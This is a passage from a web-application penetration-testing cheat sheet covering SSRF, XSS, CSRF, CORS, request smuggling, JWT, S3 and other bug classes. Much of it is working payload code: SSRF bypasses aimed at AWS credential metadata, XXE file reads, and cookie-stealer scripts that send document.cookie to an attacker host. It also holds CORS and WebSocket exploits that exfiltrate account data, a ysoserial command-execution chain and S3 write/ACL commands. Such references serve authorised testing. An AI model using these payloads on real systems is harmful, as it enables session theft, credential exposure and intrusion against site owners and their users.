  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
- Context-dependent access controls
  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it

**Tools**
- [Autorize](https://github.com/PortSwigger/autorize)
- [Authz](https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e)
- [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
- Check also endpoints in JS files



### <ins>File upload vulnerabilities</ins>

**Upload Functions check-list**
- [ ] Integrations (from 3rd party)
  - XSS
- [ ] Self Uploads
  - XML based (Docs/PDF)
    - SSRF, XSS
  - Image
    - XSS, Shell
      - Name
      - Binary header
      - Metadata
- [ ] Where is data stored?
  - [s3 perms](#abusing-s3-bucket-permissions)
  - [GCS perms](#google-cloud-storage-bucket)

**Resource**
- [How I earned $500 by uploading a file: write-up of one of my first bug bounty](https://medium.com/@seeu-inspace/how-i-earned-500-by-uploading-a-file-write-up-of-one-of-my-first-bug-bounty-c174cf8ea553)



### <ins>Server-side request forgery (SSRF)</ins>

**SSRF with blacklist-based input filters bypass**
Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose or the domain `firefox.fr` is a DNS that point to `127.0.0.1`.;
- Obfuscating blocked strings using URL encoding or case variation.

**SSRF with whitelist-based input filters bypass**
- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

**Other tips**
- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- [Open redirection](#open-redirection)
- For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
  ```PHP
  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
  ```
- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
- [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)

**Common endpoints**
- Webhooks
  - Try to send requests to internal resources
- PDF Generator
  - If there is an HTML Injection in a PDF generator, try call internal resources with something like `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF test">`, with these tags `<img>`, `<script>`, `<base>` or with the CSS element `url()`
- Document parsers
  - If it's an XML doc, use the PDF Generator approach
  - In other scenarios, see if there is any way to reference external resources and let server make requests to internal resources
- Link expansion
  - Open Graph Protocol is a good case for Blind SSRF / Extract of Meta Data, [[Reference](https://twitter.com/BugBountyHQ/status/868242771617792000)]
- File uploads
  - Instead of uploading a file, upload a URL. [An example](https://hackerone.com/reports/713)

**Automate with Burp**
- [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
- [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) + [AutoRepeater](https://github.com/nccgroup/AutoRepeater) [[Source](https://twitter.com/Bugcrowd/status/1586058991758675969)]
  ```
  - Type: Request Param Value
  - Match: ^(https?|ftp)://[^\s/$.?#].[^\s]*$
  - Replace: http://$collabplz/
  - Comment: Burp Collab
  - Regex Match: [x]
  ```



### <ins>Open redirection</ins>

**Bypasses**
- https://attacker.com?victim.com
- https://attacker.com;victim.com
- https://attacker.com/victim.com/../victimPATH
- https://victim.com.attacker.com
- https://attackervictim.com
- https://victim.com@attacker.com
- https://attacker.com#victim.com
- https://attacker.com\.victim.com
- https://attacker.com/.victim.com
- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f



### <ins>XXE injection</ins>

- Try with xinclude to achieve SSRF or LFI;
  ```XML
  <?xml version="1.0" encoding="utf-8" ?>
  <username xmls:xi="https://w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///c:/windows/win.ini">
  </username>
  ```


### <ins>Cross-site scripting (XSS)</ins>

- [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
- For **mobile applications**: try use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
- For **desktop applications**: try use as a vector the SSID with a payload like `"/><img src=x onerror=alert(1)>`

**Tools**
- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
  - [python3 version](https://github.com/L1NT/xsscrapy) 
- For blind XSS
  - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
  - [XSS Hunter](https://xsshunter.com/)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
- [ppfuzz](https://github.com/dwisiswant0/ppfuzz) a fast tool to scan client-side prototype pollution vulnerability

**CSP bypass**
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
- [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
- [CSP Bypass](https://github.com/PortSwigger/csp-bypass)

**Bypasses**
- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
- [JSFuck](http://www.jsfuck.com/)
- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- If Privileges are required, see if you can chain the XSS with a CSRF

**Swagger XSS**
- https://github.com/swagger-api/swagger-ui/issues/1262
- https://github.com/swagger-api/swagger-ui/issues/3847<br/>
  `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS%20all%20the%20things/swag-test.json`
- [Hacking Swagger-UI - from XSS to account takeovers](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)<br/>
  `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy9zd2FnLXRlc3QueWFtbCIKfQ==`
- Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`

**CRLF injection** [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)]
- `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
- Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`

**Cross Site Tracing**
- If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. Reference: https://owasp.org/www-community/attacks/Cross_Site_Tracing

**Blind XSS**
- Insert a payload in the User-Agent, try with the match/replace rule
- Other endpoints: pending review comments, feedback

**DoS**
- `%22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D` This could lead the page to refresh quickly and infinitely causing being blocked by a WAF and being a potential DoS.

**Payloads**
- HTML inj 
  ```HTML
  <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
  ```
- iframe + base64 encoded SVG 
  ```HTML
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgICAgIGFsZXJ0KGRvY3VtZW50LmNvb2tpZSk7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
  ```
- Cookie stealers
  - ```JavaScript
    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
    ```
  - ```JavaScript
    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
    ```
  - ```HTML
    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
    ```
 - onbeforeinput + contenteditable
   ```JavaScript
   %22%20onbeforeinput=alert(document.cookie)%20contenteditable%20alt=%22
   ```



### <ins>Cross-site request forgery (CSRF)</ins>

- Remove the entire token
- Use any random but same-length token, or `same-length+1`/`same-length-1`
- Use another user's token
- Change from `POST` to `GET` and delete the token
- If it's a `PUT` or `DELETE` request, try `POST /profile/update?_method=PUT` or
  ```
  POST /profile/update HTTP/1.1
  Host: vuln.com
  ...
  
  _method=PUT
  ```
- If the token it's in a custom header, delete the header
- Change the `Content-Type` to `application/json`, `application/x-url-encoded` or `form-multipart`, `text/html`, `application/xml`
- If there is double submit token, try CRLF injection
- Bypassing referrer check
  - If it's checked but only when it exists, add to the PoC `<meta name="referrer" content="never">` 
  - Regex Referral bypass
    ```
    - https://attacker.com?victim.com
    - https://attacker.com;victim.com
    - https://attacker.com/victim.com/../victimPATH
    - https://victim.com.attacker.com
    - https://attackervictim.com
    - https://victim.com@attacker.com
    - https://attacker.com#victim.com
    - https://attacker.com\.victim.com
    - https://attacker.com/.victim.com
    ```
- CSRF token stealing via XSS/HTMLi/CORS
- JSON based
  - Change the `Content-Type` to `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`
  - Use flash + 307 redirect
- Guessable CSRF token
- Clickjacking to strong CSRF token bypass
- Type juggling
- Use array, from `csrf=token` to `csrf[]=token`
- Set the CSRF token to null or add null bytes
- Check whether CSRF token is sent over http or sent to 3rd party
- Generate multiple CSRF tokens, pick the static part. Play with the dynamic part

**Resources**
- [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)


### <ins>Cross-origin resource sharing (CORS)</ins>

**Classic CORS vulnerability**
```HTML
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','$url/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
  location='/log?key='+this.responseText;
  };
</script>
```

**CORS vulnerability with null origin**
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','vulnerable-website.com/sensitive-victim-data',true);
  req.withCredentials = true;
  req.send();
     
  function reqListener() {
  location='malicious-website.com/log?key='+this.responseText;
  };</script>">
</iframe>
```

**CORS vulnerability with trusted insecure protocols**
```HTML
<script>
  document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

**Tools**
- [Corsy](https://github.com/s0md3v/Corsy) Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations



### <ins>Clickjacking</ins>

**Classic PoC**
```HTML
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Click me button</div>
<iframe src="$url"></iframe>
```

**Classic PoC + XSS**
```HTML
<style>
  iframe {
    position:relative;
    width:$width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position:absolute;
    top:$top_value;
    left:$side_value;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker.website.com&subject=test&message=test#feedbackResult"></iframe>
```



### <ins>DOM-based vulnerabilities</ins>

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location
- document.cookie
- document.referrer
- window.name
- history.pushState
- history.replaceState
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

| DOM-based vulnerability          | Example sink               |
| -------------------------------- | -------------------------- |
| DOM XSS                          | document.write()           |
| Open redirection                 | window.location            |
| Cookie manipulation              | document.cookie            |
| JavaScript injection             | eval()                     |
| Document-domain manipulation     | document.domain            |
| WebSocket-URL poisoning          | WebSocket()                |
| Link manipulation                | someElement.src            |
| Web-message manipulation         | postMessage()              |
| Ajax request-header manipulation | setRequestHeader()         |
| Local file-path manipulation     | FileReader.readAsText()    |
| Client-side SQL injection        | ExecuteSql()               |
| HTML5-storage manipulation       | sessionStorage.setItem()   |
| Client-side XPath injection      | document.evaluate()        |
| Client-side JSON injection       | JSON.parse()               |
| DOM-data manipulation            | someElement.setAttribute() |
| Denial of service                | RegExp()                   |



### <ins>WebSockets</ins>

Any web security vulnerability might arise in relation to WebSockets:
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques;
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Cross-site WebSocket hijacking (CSRF missing**
```
<script>
  websocket = new WebSocket('wss://websocket-URL');
  websocket.onopen = start;
  websocket.onmessage = handleReply;
  function start(event) {
    websocket.send("READY");
  }
  function handleReply(event) {
    fetch('https://your-domain/?'+event.data, {mode: 'no-cors'});
  }
</script>
```



### <ins>Insecure deserialization</ins>

How to spot Insecure deserialization
- PHP example
  `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
- Java objects always begin with the same bytes 
  - Hex `ac` `ed`
  - Base64 `rO0`

**Ysoserial**

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
```

[PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.

**Burp extensions**
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
- [GadgetProbe](https://portswigger.net/bappstore/e20cad259d73403bba5ac4e393a8583f)
- [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
- [PHP Object Injection Check](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7)



### <ins>Server-side template injection</ins>

- Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
- The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
- Use payloads like these
  ```
  {{7*7}}[[3*3]]
  {{7*7}}
  {{7*'7'}}
  <%= 7 * 7 %>
  ${7*7}
  ${{7*7}}
  @(7+7)
  #{7*7}
  #{ 7 * 7 }
  ```

**Resource**
- [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation



### <ins>Web cache poisoning</ins>

**Constructing a web cache poisoning attack**
 1. Identify and evaluate unkeyed inputs
 2. Elicit a harmful response from the back-end server
 3. Get the response cached

**Cache key flaws**
Many websites and CDNs perform various transformations on keyed components when they are saved in the cache key:
- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

**Cache probing methodology**<br/>
 1. Identify a suitable cache oracle
    - Simply a page or endpoint that provides feedback about the cache's behavior. This feedback could take various forms, such as: An HTTP header that explicitly tells you whether you got a cache hit, Observable changes to dynamic content, Distinct response times
 2. Probe key handling
    - Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.
 3. Identify an exploitable gadget
    - These techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched.



### <ins>HTTP Host header attacks</ins>

- "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
- CRLF injection [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)], "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]


### <ins>HTTP request smuggling</ins>

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
- Content-Length
  ```
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 11
  q=smuggling
  ```
- Transfer-Encoding
  ```
  POST /search HTTP/1.1
  Host: normal-website.com
  Content-Type: application/x-www-form-urlencoded
  Transfer-Encoding: chunked
  b
  q=smuggling
  0
  ```
  
Example
```
POST / HTTP/1.1
Host: smuggle-vulnerable.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Result: GPOST request
- Some servers do not support the Transfer-Encoding header in requests;
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

Ways to obfuscate the Transfer-Encoding header
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked`
- `Transfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- ```
  Transfer-Encoding
  : chunked
  ```

Confirming CL.TE vulnerabilities using differential responses
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

Result
```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Impact
- Bypass front-end security controls
- Revealing front-end request rewriting
- Capturing other users' requests
- Using HTTP request smuggling to exploit reflected XSS
- Turn an on-site redirect into an open redirect<br/>
  Example of 301 in Apache and IIS web servers
  ```
  GET /home HTTP/1.1
  Host: normal-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://normal-website.com/home/
  ```
  Vulnerable request
  ```
  POST / HTTP/1.1
  Host: vulnerable-website.com
  Content-Length: 54
  Transfer-Encoding: chunked
  
  0
  
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: X
  ```
  Result
  ```
  GET /home HTTP/1.1
  Host: attacker-website.com
  Foo: XGET /scripts/include.js HTTP/1.1
  Host: vulnerable-website.com
  HTTP/1.1 301 Moved Permanently
  Location: https://attacker-website.com/home/
  ```
- Perform web cache poisoning
- Perform web cache deception

**Resource**
- [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)



### <ins>JWT Attacks</ins>

A JWT consists of a `header`, a `payload`, and a `signature`. Each part is separated by a dot.<br/>
 
Common attacks
- Accepting tokens with no signature
- Brute-forcing secret keys using [hashcat](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat)
  - You need a valid JWT and a [wordlist](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
  - `hashcat -a 0 -m 16500 <jwt> <wordlist>`
  - If any of the signatures match, hashcat will give you an output like this `<jwt>:<identified-secret>` along with other details
  - Once identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. See [Signing JWTs](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#signing-jwts)
- Injecting self-signed JWTs via the `jwk`, `jku` or `kid` parameter
- Change Content-Type in `cty` to achieve XXE and deserialization attacks
- `x5c` (X.509 Certificate Chain) can lead to [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633/)
- [JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

**Resources**
- [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
  - [Checklist](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)



### <ins>OAuth authentication</ins>

How OAuth 2.0 works:
- `Client application` The website or web application that wants to access the user's data;
- `Resource owner` The user whose data the client application wants to access;
- `OAuth service provider` The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

**[OAuth flow](https://portswigger.net/web-security/oauth/grant-types)**

<img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/oauth-authorization-code-flow.jpg" alt="oauth-flow">

Following standard endpoints:
- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Vulnerabilities in the client application
- Improper implementation of the implicit grant type
- Flawed CSRF protection

Vulnerabilities in the OAuth service
- Leaking authorization codes and access tokens
- Flawed scope validation
- Unverified user registration



### <ins>Abusing S3 Bucket Permissions</ins>

Target example: `http://[name_of_bucket].s3.amazonaws.com`

**Read Permission**

- `aws s3 ls s3://[name_of_bucket]  --no-sign-request`
- `aws s3 ls s3://pyx-pkgs --recursive --human-readable --summarize`

**Write Permission**

- `aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request`

**READ_ACP**

- `aws s3api get-bucket-acl --bucket [bucketname] --no-sign`
- `aws s3api get-object-acl --bucket [bucketname] --key index.html --no-sign-request`

**WRITE_ACP**

- `aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request`
- `aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request`

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- [AWS CLI](https://aws.amazon.com/it/cli/)
- [S3Scanner](https://github.com/sa7mon/S3Scanner) A tool to find open S3 buckets and dump their contents
- [Cloud - AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
- [s3enum](https://github.com/koenrh/s3enum)
- To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Resources**
- https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
- https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html



### <ins>Google Cloud Storage bucket</ins>

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- https://github.com/RhinoSecurityLabs/GCPBucketBrute

**Resources**
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/



### <ins>GraphQL</ins>

To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.

**GraphQL Introspection query**

```
{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```
{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

```
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
```



### <ins>WordPress</ins>

- Information Disclosure [high]: `/_wpeprivate/config.json`
- Data exposure:
  - `/wp-json/wp/v2/users/`
  - `/wp-json/th/v1/user_generation`
  - `/?rest_route=/wp/v2/users`
- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```
- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with: `wpscan --url <domain> --api-token <your-api-token>`
- Nuclei templates `%USERPROFILE%\nuclei-templates\vulnerabilities\wordpress\advanced-access-manager-lfi.yaml`

**Resources**
- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md
- https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
- [WordPress Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md)



### <ins>IIS - Internet Information Services</ins>

- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
- Check if `trace.axd` is enabled
- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
- Search for
  ```
  Views/web.config
  bin/WebApplication1.dll
  System.Web.Mvc.dll
  System.Web.Mvc.Ajax.dll
  System.Web.Mvc.Html.dll
  System.Web.Optimization.dll
  System.Web.Routing.dll
  ```

Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services



### <ins>Lotus Domino</ins>

- Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
- Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
- Fuzzing list: [SecLists/LotusNotes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/LotusNotes.fuzz.txt)



### <ins>Git source code exposure</ins>

Once you have the source code, look for the secrets within the files. To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Other tools**
